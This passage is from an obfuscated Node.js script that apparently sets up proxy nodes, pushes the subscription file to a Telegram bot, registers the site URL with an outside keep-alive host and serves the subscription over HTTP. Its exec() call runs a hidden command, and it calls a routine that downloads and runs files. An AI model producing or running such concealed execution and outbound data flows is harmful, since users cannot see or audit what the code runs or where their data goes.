      : exec(_0x422c93(_0x835fbf._0x2562a9) + _0x4fb374[_0x422c93(0x198)]('\x20') + _0x422c93(_0x835fbf._0x1525b3), (_0x701205) => {
          const _0x56c130 = _0x422c93
          ;(console[_0x56c130(0x1b0)](),
            alwaysLog(_0x56c130(_0x5411a7._0x9ce3b2)),
            console[_0x56c130(_0x5411a7._0x29ec2a)](_0x56c130(_0x5411a7._0x34f4b0)))
        })
  }, 0x15f90)
}
cleanFiles()
async function sendTelegram() {
  const _0x298f85 = { _0x1f8aa8: 0xc5, _0x7ab71: 0x1a9, _0x2bcad0: 0x10d, _0x4e13b8: 0x11d, _0x568e80: 0xda },
    _0x58eca9 = _0x1b63d3
  if (!BOT_TOKEN || !CHAT_ID) {
    console[_0x58eca9(_0x298f85._0x1f8aa8)]('TG\x20variables\x20is\x20empty,\x20Skipping\x20push\x20nodes\x20to\x20TG')
    return
  }
  try {
    const _0x20089 = fs['readFileSync'](subPath, _0x58eca9(_0x298f85._0x7ab71)),
      _0x341ee9 = 'https://api.telegram.org/bot' + BOT_TOKEN + _0x58eca9(_0x298f85._0x2bcad0),
      _0x39ab9c = NAME[_0x58eca9(0x193)](/[_*\[\]()~`>#+=|{}.!-]/g, _0x58eca9(0xf8)),
      _0x393c9b = { chat_id: CHAT_ID, text: '**' + _0x39ab9c + '节点推送**\x0a```' + _0x20089 + _0x58eca9(0x19a), parse_mode: 'MarkdownV2' }
    ;(await axios[_0x58eca9(_0x298f85._0x4e13b8)](_0x341ee9, null, { params: _0x393c9b }), console[_0x58eca9(0xc5)](_0x58eca9(_0x298f85._0x568e80)))
  } catch (_0x4849c0) {
    console[_0x58eca9(0x140)](_0x58eca9(0xff), _0x4849c0[_0x58eca9(0x98)])
  }
}
async function AddVisitTask() {
  const _0x376f20 = { _0xc6d596: 0x11d, _0x1b940a: 0xc5 },
    _0x51e099 = _0x1b63d3
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console[_0x51e099(0xc5)](_0x51e099(0x1ac))
    return
  }
  try {
    const _0x1fc18c = await axios[_0x51e099(_0x376f20._0xc6d596)](
      'https://oooo.serv00.net/add-url',
      { url: PROJECT_URL },
      { headers: { 'Content-Type': _0x51e099(0x172) } }
    )
    return (console[_0x51e099(_0x376f20._0x1b940a)]('automatic\x20access\x20task\x20added\x20successfully'), _0x1fc18c)
  } catch (_0x362768) {
    return (console[_0x51e099(0x140)](_0x51e099(0x162) + _0x362768['message']), null)
  }
}
async function startserver() {
  const _0x530cd6 = { _0x1ba33f: 0x10e },
    _0x2245dc = _0x1b63d3
  try {
    ;(argoType(),
      deleteNodes(),
      cleanupOldFiles(),
      isValidPort(REALITY_PORT) && generateOrLoadKeyPair(),
      isValidPort(HY2_PORT) && ensureTlsCertificates(certPath, keyPath),
      await generateConfig(),
      await downloadFilesAndRun(),
      await extractDomains(),
      await sendTelegram(),
      await AddVisitTask())
  } catch (_0x417e31) {
    console[_0x2245dc(0x140)](_0x2245dc(_0x530cd6._0x1ba33f), _0x417e31)
  }
}
startserver()[_0x1b63d3(0x19d)]((_0x22b3e8) => {
  const _0x759eb4 = { _0x206f02: 0x140, _0x5cba53: 0xdf },
    _0x5df7c2 = _0x1b63d3
  console[_0x5df7c2(_0x759eb4._0x206f02)](_0x5df7c2(_0x759eb4._0x5cba53), _0x22b3e8)
})
const server = http[_0x1b63d3(0x97)](async (_0x22b33d, _0xef8e9d) => {
  const _0x243c67 = {
      _0x22eb55: 0x116,
      _0xff8b0f: 0xd7,
      _0x28f889: 0x1a6,
      _0x596aed: 0x118,
      _0x451887: 0xd7,
      _0x14f55b: 0x118,
      _0x4c7d1a: 0x1a6,
      _0x36d807: 0x118,
      _0x341c39: 0x120,
      _0x2f1d4f: 0x118
    },
    _0x4de7f8 = _0x1b63d3,
    _0x3f2d97 = _0x22b33d[_0x4de7f8(_0x243c67._0x22eb55)]['split']('?')[0x0]
  if (_0x3f2d97 === '/' + SUB_PATH) {
    if (subContent)
      (_0xef8e9d[_0x4de7f8(0x118)](0xc8, { 'Content-Type': _0x4de7f8(_0x243c67._0xff8b0f) }), _0xef8e9d[_0x4de7f8(_0x243c67._0x28f889)](subContent))
    else
      try {
        const _0x56e466 = fs[_0x4de7f8(0x195)](subPath, 'utf-8')
        ;(_0xef8e9d[_0x4de7f8(_0x243c67._0x596aed)](0xc8, { 'Content-Type': _0x4de7f8(_0x243c67._0xff8b0f) }),
          _0xef8e9d[_0x4de7f8(_0x243c67._0x28f889)](_0x56e466))
      } catch (_0x5ae429) {
        ;(_0xef8e9d[_0x4de7f8(0x118)](0x1f7, { 'Content-Type': _0x4de7f8(_0x243c67._0x451887) }), _0xef8e9d[_0x4de7f8(0x1a6)](_0x4de7f8(0xad)))
      }
    return
  }
  if (_0x3f2d97 === '/') {
    try {
      const _0x40058b = path[_0x4de7f8(0x198)](__dirname, _0x4de7f8(0x11f)),
        _0x1bc394 = await fs[_0x4de7f8(0x1aa)][_0x4de7f8(0x16d)](_0x40058b, 'utf8')
      ;(_0xef8e9d[_0x4de7f8(_0x243c67._0x14f55b)](0xc8, { 'Content-Type': _0x4de7f8(0xc1) }), _0xef8e9d[_0x4de7f8(_0x243c67._0x4c7d1a)](_0x1bc394))
    } catch (_0x4a7e9f) {
      ;(_0xef8e9d[_0x4de7f8(_0x243c67._0x36d807)](0xc8, { 'Content-Type': 'text/html;\x20charset=utf-8' }),
        _0xef8e9d[_0x4de7f8(0x1a6)](_0x4de7f8(_0x243c67._0x341c39)))
    }
    return
  }
  ;(_0xef8e9d[_0x4de7f8(_0x243c67._0x2f1d4f)](0x194, { 'Content-Type': 'text/plain;\x20charset=utf-8' }), _0xef8e9d[_0x4de7f8(0x1a6)]('Not\x20Found'))
})
server['listen'](PORT, () => alwaysLog(_0x1b63d3(0xac) + PORT + '!'))
